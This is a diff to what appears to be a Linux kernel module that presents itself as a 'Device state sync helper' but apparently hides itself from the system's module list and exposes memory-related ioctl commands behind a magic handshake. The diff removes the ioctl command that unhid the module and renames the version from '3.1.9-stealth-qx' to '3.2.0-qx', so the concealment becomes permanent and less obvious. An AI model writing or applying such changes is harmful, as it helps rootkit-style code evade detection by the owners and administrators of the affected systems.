@@ -17,7 +17,6 @@
 #define QX_CMD_MOD_BASE		0x803
 #define QX_CMD_HANDSHAKE	0x804
 #define QX_CMD_CLEAR		0x805
-#define QX_CMD_UNHIDE		0x806
 #define QX_HANDSHAKE_MAGIC	666
 
 static dev_t qx_dev;
@@ -94,10 +93,6 @@ static long qx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		return 2;
 
 	case QX_CMD_CLEAR:
-		return 0;
-
-	case QX_CMD_UNHIDE:
-		kmem_unhide_module(THIS_MODULE);
 		return 0;
 
 	default:
@@ -196,10 +191,6 @@ static long qx_compat_ioctl(struct file *file, unsigned int cmd, unsigned long a
 		return 2;
 
 	case QX_CMD_CLEAR:
-		return 0;
-
-	case QX_CMD_UNHIDE:
-		kmem_unhide_module(THIS_MODULE);
 		return 0;
 
 	default:
@@ -344,4 +335,4 @@ module_exit(qx_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("dmsync");
 MODULE_DESCRIPTION("Device state sync helper");
-MODULE_VERSION("3.1.9-stealth-qx");
+MODULE_VERSION("3.2.0-qx");
